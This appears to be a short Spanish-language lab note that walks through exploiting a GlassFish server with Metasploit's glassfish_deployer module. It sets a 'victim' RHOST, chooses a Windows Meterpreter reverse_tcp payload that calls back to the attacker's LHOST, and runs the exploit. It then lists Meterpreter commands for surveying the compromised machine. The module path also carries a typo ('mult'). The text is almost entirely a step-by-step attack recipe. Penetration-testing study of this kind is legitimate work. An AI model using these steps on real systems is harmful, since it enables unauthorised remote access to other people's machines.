# Glassfish

## Pasos a seguir

Abrimos primero 'msfconsole'

Seleccionamos el módulo con 'use exploit/mult/http/glassfish_deployer'

Buscamos las opciones con 'show options'

Establecemos la dirección IP de la máquina víctima (RHOST), el tipo de payload que deseas utilizar (PAYLOAD)
y tu propia dirección IP (LHOST) para la conexión inversa:

set RHOST 192.168.1.144

set PAYLOAD windows/meterpreter/reverse_tcp

set LHOST 192.168.1.143

Ejecutamos el exploit con: 'exploit'

## Una vez dentro podemos ejecutar

-sysinfo: Para obtener información sobre el sistema operativo de la máquina víctima.

-getuid: Para obtener el identificador del usuario actual en la máquina víctima.

-ipconfig: Para obtener información sobre la configuración de red de la máquina víctima(depende del sistema operativo de la víctima).

-ps: Para listar los procesos en ejecución en la máquina víctima.
